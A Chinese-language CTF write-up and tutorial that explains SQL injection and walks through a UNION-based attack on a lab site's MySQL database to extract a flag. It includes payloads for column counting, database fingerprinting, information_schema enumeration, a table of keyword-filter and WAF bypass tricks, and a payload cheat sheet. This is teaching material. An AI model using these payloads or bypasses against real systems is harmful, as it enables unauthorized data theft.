### 三、什么是SQL 注入？

#### 1.数据库：

一个专门存数据的软件。你可以把它想成一张超大的 Excel 表，一行是一条记录，一列是一个字段。

#### 2.SQL：

跟数据库说话的"咒语"。比如网站想查序号为 1 的记录，它会念一句：

```sql
SELECT id, name, subject FROM public_subjects WHERE id = 1
```

翻译成人话："从 `public_subjects` 这张表里，把 id 等于 1 的那一行的 id、name、subject 三个字段拿出来。"

**那注入是怎么发生的？**

问题出在"1"这个数字上。程序员偷懒的时候，代码是这么写的（伪代码）：

```python
sql = "SELECT id, name, subject FROM public_subjects WHERE id = " + 用户输入
```

看到没？用户输入被**用 `+` 号直接拼进字符串**了。

正常情况下，你输入 `1`，拼出来就是上面那句，没毛病。

但是——**如果用户输入的不是数字，而是一段 SQL 代码呢？**

这个拼接的动作，等于把"我要查 1 号"变成了"我要查 1 号 **，顺便帮我执行下面这句话**"。数据库分不清哪部分是程序员的原意、哪部分是用户塞进来的私货，它就老老实实全执行了。

这就是 **SQL 注入（SQL Injection）**：**用户输入被当成代码执行了。**

> **防注入的正确做法**叫**参数化查询（预编译）**：先告诉数据库"这句 SQL 有个坑，待会儿填东西进去"，数据库就会把坑里的内容**永远当成数据、绝不当成代码**。这道题显然是没做。

### 四、确认这里真的有注入

知道了原理，接下来要验证。我发了几个包，每个都是**带着问题去问服务器**：

| 我发的内容（id 参数的值） | 服务器返回 | 我的解读 |
|---|---|---|
| `1` | 正常 1 条记录 | 基线，先记下"正常"长什么样 |
| `999999` | 没有找到匹配记录 | 查不到时的正常表现，做对照 |
| `abc` | 没有找到匹配记录 | 同上 |
| `1'`（一个单引号） | **没有找到匹配记录** | 有戏！ |
| `1 OR 1=1` | **一次返回全部 5 条！** | 注入成立！ |
| `1 AND 1=2` | 没有找到匹配记录 | 条件为假就查不到，进一步印证 |

#### 1. `1'` ：

在 SQL 里，单引号是用来**包裹字符串**的，必须成对出现，如’1‘。

如果参数是安全的（被正确处理成数据），我多打一个引号，网站顶多当成"序号叫 `1'` 的东西"，查不到而已，**绝不会影响数据库本身**。

但它让查询**出错了**（页面变成了"没有找到匹配记录"而不是正常报错，说明错误被程序吞掉了）。**能搞坏 SQL 语法 = 我的输入真的跑进 SQL 语句里了。**

#### 2.为什么 `1 OR 1=1` 是决定性的？

`OR` 是"或者"，`1=1` 永远成立。拼接后 SQL 变成：

```sql
SELECT id, name, subject FROM public_subjects WHERE id = 1 OR 1=1
```

意思是"id 等于 1 **或者** 恒成立"——既然后半句恒成立，那整句话对**每一行**都成立，所以 5 条记录全被捞出来了。

**页面返回条数从 1 变成 5，这就是注入生效的铁证。**

> **报错被吞 ≠ 没有漏洞**。
> 
>- 报错被吞只是拿不到报错信息，做不了"报错注入"（那是另一条路）
> - 但只要 `OR 1=1` 能**改变页面回显**，我们就能靠"看回显猜答案"，这条路叫**回显注入**
>

### 五、数字型还是字符型？

简单说，**原始 SQL 里参数有没有被引号包着**，决定了你 payload 的写法：

| 类型 | 原始 SQL 大概长这样 | 你要怎么打 | 例子 |
|---|---|---|---|
| **数字型** | `WHERE id = 1` | **不用闭合引号**，直接接 | `1 OR 1=1` |
| **字符型** | `WHERE name = '1'` | 要先**闭合**那个单引号 | `1' OR '1'='1` |

**我们这道题是数字型**，证据就是：`1 OR 1=1` 里我**一个引号都没打**，它就生效了。说明原来的 SQL 里那个 `1` 是光秃秃的，没被引号包着。

> **判断口诀**：先打一个单引号。
>
> - 报错 → 说明引号配对被我破坏了 → 字符型（得用引号闭合）
> - 不报错、`OR 1=1` 却生效了 → 数字型，直接接就行

### 六、用 UNION 拿到"我自己的回显位"

现在我知道能注入，但我想显示的**不是表里原有的数据，而是我编的查询结果**（比如数据库版本、别的表名）。这就要用到 `UNION`。

#### 1.UNION 是什么

`UNION` 的作用是**把两条 SELECT 的结果上下拼在一起**：

```sql
SELECT 1,2,3
UNION
SELECT 4,5,6
```

结果就是两行：`1,2,3` 和 `4,5,6`。

**但有一条铁律：前后两条 SELECT 的列数必须完全一样**，否则数据库直接报错。

所以我必须先知道原查询有几列。这既是为了满足语法，也顺便探出**页面上有几个格子能显示我的数据**（术语叫"回显位"）。

#### 2.试列数

| payload | 结果 | 说明 |
|---|---|---|
| `-1 UNION SELECT 1,2,3` | ✅ 页面显示 `1 \| 2 \| 3` | **正好 3 列**，且三列全都回显 |
| `-1 UNION SELECT 1,2,3,4` | ❌ 查不到 | 列数不匹配，报错 |
| `-1 UNION SELECT 1,2,3,4,5` | ❌ 查不到 | 同上 |

![image-20260911211306877](/assets/hehu-sql-injection/image-20260911211306877.png)

![image-20260911211344452](/assets/hehu-sql-injection/image-20260911211344452.png)

![image-20260911211354171](/assets/hehu-sql-injection/image-20260911211354171.png)

**结论：3 列，三列全部可以回显数据。**

#### 3.为什么用 `-1` 而不是 `1`？

如果写 `1 UNION SELECT 1,2,3`，结果会是**两行**：原始的第 1 条记录 + 我造的那行。

![image-20260911211448947](/assets/hehu-sql-injection/image-20260911211448947.png)

而写 `-1`（一个表里不存在的序号，因为 id 通常从 1 开始），前半句查了个空，页面上就**只剩我注入的内容**了，干净、不会和真实数据混淆。

> **小习惯**：做 UNION 注入时永远优先用 `-1`、`0`、`9999` 这类查不到的 id。

![image-20260911211546013](/assets/hehu-sql-injection/image-20260911211546013.png)

### 七、先问清楚"对面是谁"

不同数据库（MySQL / SQLite / PostgreSQL / SQL Server）的语法和系统表**完全不一样**，接下来的 payload 全都要针对具体数据库写。所以必须先确认。

| payload | 返回 | 结论 |
|---|---|---|
| `-1 UNION SELECT 1,version(),database()` | `8.0.46` / `past_paper` | ✅ **MySQL 8.0.46**，当前库叫 `past_paper` |
| `-1 UNION SELECT 1,sqlite_version(),1` | ❌ 报错 | 排除 SQLite |
| `-1 UNION SELECT 1,user(),1` | `ctf@127.0.0.1` | 数据库账号是 `ctf` |

三个函数记住它们的作用：

- `version()` —— 数据库版本
- `database()` —— 当前所在的库名
- `user()` —— 当前数据库账号
- `@@version` 是 MySQL 的"系统变量"写法

![image-20260911213556726](/assets/hehu-sql-injection/image-20260911213556726.png)

![image-20260911213648579](/assets/hehu-sql-injection/image-20260911213648579.png)

![image-20260911214100186](/assets/hehu-sql-injection/image-20260911214100186.png)

#### 1."同一个问题，在不同数据库里怎么问"的对照表：

| 我想知道   | MySQL                       | SQLite                   | PostgreSQL                  | SQL Server                  |
| ---------- | --------------------------- | ------------------------ | --------------------------- | --------------------------- |
| 版本       | `version()` / `@@version`   | `sqlite_version()`       | `version()`                 | `@@version`                 |
| 当前库     | `database()`                | 无（看 `sqlite_master`） | `current_database()`        | `db_name()`                 |
| 当前用户   | `user()`                    | 无                       | `current_user`              | `user_name()`               |
| 表清单     | `information_schema.tables` | `sqlite_master`          | `information_schema.tables` | `information_schema.tables` |
| 多行拼接   | `group_concat(x)`           | `group_concat(x)`        | `string_agg(x,',')`         | `string_agg(x,',')`         |
| 字符串拼接 | `concat(a,b)`               | `a\|\|b`                 | `a\|\|b`                    | `a+b`                       |
| 注释       | `-- ` `#` `/**/`            | `--` `/**/`              | `--` `/**/`                 | `--` `/**/`                 |

**这张表里的每一格，都是"同一个问题的不同问法"。**

#### 2.别背 payload，学"问问题"

背 payload 会背死，因为数据库太多、版本太多、过滤规则也太多。你要练的是这个**三步思考习惯**：

```
① 我要什么信息？
        ↓
② 哪个表达式能给我这个信息？
        ↓
③ 这个表达式的成功/失败/返回值，在各个库里一样吗？
        ├─ 一样   → 换一个
        └─ 不一样 → 它就是好探针 ✅
```

**按这个思路，你自己就能造出探针**，比如：

| 现推的探针           | 为什么它能当探针                                             |
| -------------------- | ------------------------------------------------------------ |
| `SELECT 1\|\|1`      | 能用 `\|\|` 拼接的是 SQLite / PostgreSQL，MySQL 里 `\|\|` 是逻辑或，`SELECT 1\|\|1` 得到 `1` 而不是 `11`   |
| `SELECT 1 LIMIT 1`   | MySQL / SQLite / PostgreSQL 支持；SQL Server 不支持（它用 `TOP`） |
| `SELECT 1 FROM dual` | 只有 Oracle 需要 `dual` 这张虚拟表                           |

#### 3.实战里更快的线索

真干活的时候，识别数据库有更省事的路。**注入探测是最后手段，不是第一手段：**

| 线索              | 例子                                      | 说明                                                 |
| ----------------- | ----------------------------------------- | ---------------------------------------------------- |
| **报错原文**      | `You have an error in your SQL syntax...` | 最直接！一看就知道是 MySQL。这题报错被吞了，所以没戏 |
| **响应头**        | `Server: nginx` / `X-Powered-By: PHP`     | 能缩小范围（ASP.NET 通常是 SQL Server）              |
| **URL / 后缀**    | `.aspx` / `.php` / `.jsp`                 | 猜后端技术栈                                         |
| **报错页样式**    | 蓝底白字的 ASP.NET 错误页                 | 一眼 SQL Server                                      |
| **`--` 能不能用** | MySQL 的 `--` **后面必须跟空格**          | 很小的语法差异，但能区分                             |

#### 4.探针被拦了怎么办（关键字过滤 / WAF）

上面讲的都是"顺利"的情况。但真实题目里，出题人经常会**把一些关键字拦掉**，你的探针可能压根发不出去。

这一节讲这种情况怎么办。

##### (1)先搞清楚："拦截"是谁干的

有两种，处理思路不一样：

| 类型                             | 长什么样                                         | 特点                                                         |
| -------------------------------- | ------------------------------------------------ | ------------------------------------------------------------ |
| **应用层黑名单**（CTF 里最常见） | 页面回一句"咬你哦！""非法的输入"之类的自定义文案 | 出题人自己在代码里写的 `preg_match` / `if "union" in x: die()` |
| **真正的 WAF**                   | 返回 403，或者一个很正式的"您的请求已被拦截"页面 | 商业设备/云服务，规则更复杂                                  |

**怎么区分？** 看返回内容 —— **自定义的搞笑文案基本就是出题人自己写的黑名单**，这种最好办，因为它规则简单、往往有漏洞。

##### (2)摸清"它到底拦了什么"

不要一上来就瞎试绕过。先做**减法**，把范围缩小：

| 我发的      | 结果 | 我能推出什么                               |
| ----------- | ---- | ------------------------------------------ |
| `union`     | 被拦 | `union` 这个词在黑名单里                   |
| `unio`      | 正常 | 不是拦前缀，是**整词匹配**                 |
| `VERSION()` | 正常 | 它**只拦小写**，大小写不敏感的黑名单没写好 |
| `version`   | 被拦 | 确认 `version` 在黑名单里                  |

> **这套"一个词一个词试，看哪个触发拦截"的方法，就是摸规则。**
> 记住：**差异化报错是摸清过滤规则最快的手段** —— 拦截和不拦截的页面长得不一样，这本身就是信息。

##### (3)对症下药（六种常用绕过）

摸清楚拦了什么之后，再挑对应的绕法：

| 被拦的东西                          | 绕过写法                                                     | 原理                                                         |
| ----------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **大小写**                          | `VERSION()`、`VeRsIoN()`                                     | MySQL 的函数名和关键字**不区分大小写**，但很多黑名单是拿小写字符串去比的 |
| **`version` 这个词**                | `@@version`、`@@global.version`                              | 系统变量是**另一种**取版本的方式，根本不经过函数名           |
| **`version` 和 `@@version` 都被拦** | `/*!version()*/`、`/*!50000version()*/`                      | MySQL 的**内联注释**：`/*! */` 里的内容**照样会被执行**，但黑名单通常不认这种写法 |
| **空格被过滤**                      | `/**/`、`%09`(Tab)、`%0a`(换行)、`()`                        | 用注释或空白字符代替空格，比如 `union/**/select`             |
| **逗号被过滤**                      | `LIMIT 1 OFFSET 0` 代替 `LIMIT 0,1`                          | 同样是分页，换一种不写逗号的语法                             |
| **单引号被过滤**                    | `0x75736572`（十六进制）、`char(117,115,101,114)`            | 不用引号也能表示字符串                                       |
| **`union` 被拦**                    | `UnIoN`、`union/**/select`、`/*!50000union*/`、`union%0aselect` | 上面几种的组合拳                                             |

**还有几个"同义词替换"很好用**，专门对付函数名被拦：

| 想干嘛 | 被封了                      | 换成                                                         |
| ------ | --------------------------- | ------------------------------------------------------------ |
| 看库名 | `database()`                | `schema()`（MySQL 里是同义词）                               |
| 看用户 | `user()`                    | `current_user()`、`session_user()`、`system_user()`          |
| 看版本 | `version()`                 | `@@version`、`@@version_compile_os`、`@@hostname`            |
| 查表名 | `information_schema.tables` | `mysql.innodb_table_stats`、`performance_schema`（MySQL 8 有时能用） |

##### (4)更重要的思路：换探针，而不是硬绕

上面列的都是"怎么把被拦的那个词写出来"。但我要说一个**更省事、更本质**的做法：

> **如果某个探针被死死拦住，最好的办法往往不是硬绕，而是换一个探针。**

举个例子。我想确认"这是 MySQL"：

```
version() 被拦
    ↓ 换
@@version 也被拦
    ↓ 别再硬绕了，换个思路 —— 我其实不需要版本号
    ↓
我需要的只是"一个能区分 MySQL 和其他库的特征"，那我还有一堆选择：
   · information_schema 这张表存不存在？
   · user() 返回的值里有没有 `用户名@主机` 这个格式？
   · GROUP_CONCAT() 能不能用？
   · `-- ` 注释后面跟空格能不能生效？
```

**任何能区分的特征都行，不一定是版本号。**

这正好呼应第三节的**三步思考法**：

```
① 我要什么信息？   → "我想知道这是不是 MySQL"
② 哪个表达式能给？ → 版本号只是其中一个选择
③ 各库表现一样吗？ → 不一样的就是好探针
```

**探针的目的是"区分"，不是"背某一条 payload"。** 这条被拦了，就换下一条。

一句话：

> **黑名单是"列出所有坏东西"，绕过是"找一个没被列出来的等价物"。**
> **前者是有限的，后者是无限的。**

出题人能想到的坏词是有限的，但等价写法是写不完的 —— `/*! */`、`@@变量`、同义词函数、十六进制、多层编码……只要有**一种**没被列进去，防线就破了。

这也是 CTF 里反复出现的规律：黑名单式防御（`blacklist`）几乎总会被绕过，真正靠谱的是**白名单**（只允许已知安全的输入）和**参数化查询**（让输入永远只是数据、不是代码）。

### 八、把库里的表全列出来

题目说数据"藏在深处"，那到底藏哪张表里？这里要请出注入界**最重要的一个东西：`information_schema`**。

#### 1.information_schema 是什么

MySQL 自带了一个"**描述数据库自己的数据库**"，叫 `information_schema`。它里面记着：

- `information_schema.tables` —— 所有表（表名、属于哪个库）
- `information_schema.columns` —— 所有列（字段名、属于哪张表）
- `information_schema.schemata` —— 所有数据库

**它就是数据库的"户口本"。** 我们要查表名、列名，全从这里拿。这个库名要背下来，九成 MySQL 注入题都靠它。

#### 2.我发的 payload

```sql
-1 UNION SELECT 1,2,group_concat(table_name)
  FROM information_schema.tables
  WHERE table_schema=database()
```

![image-20260913104904215](/assets/hehu-sql-injection/image-20260913104904215.png)

解释一下几个部分：

- `FROM information_schema.tables` —— 从"表清单"里查
- `WHERE table_schema=database()` —— 只要**当前这个库**的表（不写的话会把 MySQL 自带的一堆系统表也捞出来，刷屏）
- `group_concat(表名)` —— 见下面的说明

#### 3.`group_concat()` 是干嘛的

**这是回显注入的救命技巧。**

普通 SELECT 一次返回**多行**，但页面只有 3 个格子，装不下。

`group_concat()` 会把多行的值用逗号**拼成一行字符串**，这样一个格子就能带回全部结果。

**结果：**

```
flag_table, past_paper, public_subjects
```

三张表：

- `flag_table` —— 名字都不装了，flag 表
- `past_paper` —— 试卷表（就是题面说的"往年试题"）
- `public_subjects` —— 公开科目表（首页给你看的那张）

> **小技巧**：可以用 `0x3a` 当分隔符，`0x3a` 是冒号 `:` 的十六进制写法，等价于 `char(58)`（分号 `;` 则是 `0x3b`／`char(59)`）。用十六进制的好处是不用打引号，遇到"过滤引号"的题能用上。

### 十一、完整攻击链

```
题面出现"数据库 / 隐藏 / 绕过"
        ↓
找到查询表单  POST /  ，参数 id
        ↓
打 1'  ──→ 报错（被吞）  ──→  参数真的拼进了 SQL
        ↓
打 1 OR 1=1  ──→ 返回全部 5 条  ──→  数字型注入，无需闭合引号
        ↓
UNION SELECT 1,2,3  ──→  3 列，且全部回显
        ↓
version() / database()  ──→  MySQL 8.0.46 / past_paper
        ↓
information_schema.tables  ──→  flag_table
        ↓
information_schema.columns  ──→  列名 flag
        ↓
UNION SELECT flag FROM flag_table  ──→ flag
```

### 十二、Payload 速查表

```sql
-- ① 判有没有注入
1'                        -- 报错 = 有戏
1 OR 1=1                  -- 数字型：返回变多 = 成立
1' OR '1'='1              -- 字符型

-- ② 定列数
-1 ORDER BY 3             -- 不报错 = 至少 3 列
-1 UNION SELECT 1,2,3     -- 直接试，报错就加减列数

-- ③ 探数据库信息
-1 UNION SELECT 1,version(),database()
-1 UNION SELECT 1,user(),@@version

-- ④ 查所有表名
-1 UNION SELECT 1,2,group_concat(table_name)
   FROM information_schema.tables
   WHERE table_schema=database()

-- ⑤ 查某张表的列名
-1 UNION SELECT 1,2,group_concat(column_name)
   FROM information_schema.columns
   WHERE table_schema=database() AND table_name='表名'

-- ⑥ 取数据
-1 UNION SELECT 1,2,group_concat(字段名) FROM 表名
```

### 十三、名词表

| 名词 | 大白话解释 |
|---|---|
| **SQL** | 跟数据库说话的"咒语"语言，`SELECT ... FROM ... WHERE ...` 是最常见的一句 |
| **注入（Injection）** | 用户输入被当成代码执行了 |
| **SQL 注入** | 具体指用户输入的 SQL 片段被数据库执行 |
| **数字型注入** | 原 SQL 里参数没有引号包着，payload 不用闭合引号 |
| **字符型注入** | 原 SQL 里参数被引号包着，payload 要先闭合引号 |
| **回显 / 回显位** | 查询结果在页面上显示出来的位置。能回显，注入就好做 |
| **UNION 注入** | 用 `UNION SELECT` 伪造一行数据，把想查的东西显示在页面上 |
| **列数** | SELECT 出来的字段个数，UNION 前后必须一致 |
| **information_schema** | MySQL 自带的"户口本"库，记录所有库名、表名、列名 |
| **group_concat()** | 把多行结果拼成一行字符串，方便一次回显 |
| **hex()** | 把内容转成十六进制，避免编码/转义问题，用来校验数据 |
| **参数化查询** | 防注入的正确写法，让用户输入永远只当数据、不当代码 |
| **报错注入** | 靠数据库报错信息带出数据。本题报错被吞了，走不通 |
| **盲注** | 页面什么都不显示时，靠"是/否"或时间差一点点猜。 |
